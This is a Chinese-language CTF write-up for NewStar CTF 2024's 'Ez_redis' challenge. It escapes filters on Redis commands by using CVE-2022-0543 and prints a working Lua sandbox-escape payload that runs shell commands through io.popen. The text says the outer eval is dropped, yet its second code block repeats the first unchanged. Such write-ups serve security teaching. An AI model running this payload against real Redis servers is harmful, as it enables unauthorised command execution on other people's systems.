---
titleTemplate: ':title | WriteUp - NewStar CTF 2024'
---

# Ez_redis

考了个 redis 命令执⾏以及其历史漏洞

![](/assets/images/wp/2024/week5/Ez_redis_1.png)

在这里其实给出了示例

结合题目不难发现就是个 redis 语法

如果你有信息收集意识的话还会发现

![](/assets/images/wp/2024/week5/Ez_redis_2.png)

关键点在：

![](/assets/images/wp/2024/week5/Ez_redis_3.png)

百度 redis 常⽤利⽤⽅法，发现如果过滤了set，php

那么我们很难通过写 webshell，写⼊计划任务，主从复制来 getshell

于是我们搜索⼀下 redis5 历史漏洞 

发现 CVE-2022-0543 值得⼀试: https://gitcode.com/gh_mirrors/vu/vulhub/blob/master/redis/CVE-2022-0543/README.zh-cn.md 

于是我们得到了⼀个 payload:

```
eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0
```

由于我们⽹站执⾏的是 redis 命令

于是去掉外⾯的 eval 即可

```
eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0
```

![](/assets/images/wp/2024/week5/Ez_redis_4.png)